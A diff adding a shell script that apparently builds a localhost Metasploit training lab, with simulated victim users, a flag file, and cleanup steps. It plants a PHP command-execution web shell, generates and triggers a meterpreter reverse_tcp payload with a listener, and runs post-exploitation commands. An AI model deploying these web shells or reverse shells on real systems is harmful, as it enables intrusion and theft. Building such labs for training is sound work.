@@ -1,0 +1,220 @@
+# ==========================================
+# Full Internal Penetration Testing Lab
+# Metasploit Red Team Simulation
+# ==========================================
+
+# ------------------------------------------
+# STEP 1 — Update and Install Requirements
+# ------------------------------------------
+
+sudo apt update
+
+sudo apt install -y ruby-full nmap netcat-traditional iproute2 php
+
+
+# ------------------------------------------
+# STEP 2 — Create Simulated Victim Users
+# ------------------------------------------
+
+sudo adduser victim --disabled-password --gecos ""
+
+sudo adduser webuser --disabled-password --gecos ""
+
+
+# ------------------------------------------
+# STEP 3 — Create Vulnerable Web Directory
+# ------------------------------------------
+
+sudo mkdir -p /home/webuser/web/uploads
+
+
+# ------------------------------------------
+# STEP 4 — Create Vulnerable PHP Web Shell
+# ------------------------------------------
+
+echo '<?php system($_GET["cmd"]); ?>' | sudo tee /home/webuser/web/uploads/upload.php
+
+
+# ------------------------------------------
+# STEP 5 — Create Simulated Sensitive File
+# ------------------------------------------
+
+echo "FLAG{simulated_web_flag}" | sudo tee /home/webuser/web/uploads/flag.txt
+
+
+# ------------------------------------------
+# STEP 6 — Set Ownership Permissions
+# ------------------------------------------
+
+sudo chown -R webuser:webuser /home/webuser/web
+
+
+# ------------------------------------------
+# STEP 7 — Create Fake Echo TCP Service
+# ------------------------------------------
+
+sudo tee /home/victim/fake_service.py > /dev/null << 'EOF'
+#!/usr/bin/env python3
+
+import socketserver
+
+class EchoHandler(socketserver.BaseRequestHandler):
+
+    def handle(self):
+
+        self.request.sendall(
+            b"Welcome to Echo Service\r\n"
+        )
+
+        while True:
+
+            data = self.request.recv(1024)
+
+            if not data:
+                break
+
+            self.request.sendall(b"ECHO: " + data)
+
+if __name__ == "__main__":
+
+    with socketserver.TCPServer(("0.0.0.0", 9003), EchoHandler) as server:
+        server.serve_forever()
+
+EOF
+
+
+# ------------------------------------------
+# STEP 8 — Make Fake Service Executable
+# ------------------------------------------
+
+sudo chmod +x /home/victim/fake_service.py
+
+sudo chown victim:victim /home/victim/fake_service.py
+
+
+# ------------------------------------------
+# STEP 9 — Start Fake Echo Service
+# ------------------------------------------
+
+sudo -u victim nohup python3 /home/victim/fake_service.py > /tmp/fake_service.log 2>&1 &
+
+
+# ------------------------------------------
+# STEP 10 — Test Echo Service
+# ------------------------------------------
+
+nc 127.0.0.1 9003
+
+
+# ------------------------------------------
+# STEP 11 — Reconnaissance Scan
+# ------------------------------------------
+
+nmap -p 22,8080,9003 127.0.0.1
+
+
+# ------------------------------------------
+# STEP 12 — Generate Meterpreter Payload
+# ------------------------------------------
+
+msfvenom -p php/meterpreter/reverse_tcp \
+LHOST=127.0.0.1 \
+LPORT=4443 \
+-f raw \
+-o shell.php
+
+
+# ------------------------------------------
+# STEP 13 — Deploy Payload
+# ------------------------------------------
+
+sudo cp shell.php /home/webuser/web/uploads/shell.php
+
+sudo chown webuser:webuser /home/webuser/web/uploads/shell.php
+
+
+# ------------------------------------------
+# STEP 14 — Start Metasploit Listener
+# ------------------------------------------
+
+msfconsole
+
+
+# Inside Metasploit Console
+
+use exploit/multi/handler
+
+set PAYLOAD php/meterpreter/reverse_tcp
+
+set LHOST 127.0.0.1
+
+set LPORT 4443
+
+run
+
+
+# ------------------------------------------
+# STEP 15 — Start PHP Web Server
+# ------------------------------------------
+
+sudo -u webuser php -S 127.0.0.1:8080 -t /home/webuser/web/uploads
+
+
+# ------------------------------------------
+# STEP 16 — Trigger Payload
+# ------------------------------------------
+
+curl http://127.0.0.1:8080/shell.php
+
+
+# ------------------------------------------
+# STEP 17 — Meterpreter Post Exploitation
+# ------------------------------------------
+
+sysinfo
+
+getuid
+
+ls
+
+cat flag.txt
+
+
+# ------------------------------------------
+# STEP 18 — Spawn Interactive Shell
+# ------------------------------------------
+
+shell
+
+whoami
+
+id
+
+uname -a
+
+
+# ------------------------------------------
+# STEP 19 — Cleanup Services
+# ------------------------------------------
+
+sudo pkill -f php
+
+sudo pkill -f msfconsole
+
+sudo pkill -f ruby
+
+sudo pkill -f fake_service
+
+
+# ------------------------------------------
+# STEP 20 — Remove Simulated Users
+# ------------------------------------------
+
+sudo deluser --remove-home victim
+
+sudo deluser --remove-home webuser
+
+
+# ==========================================
+# END OF LAB
+# ==========================================
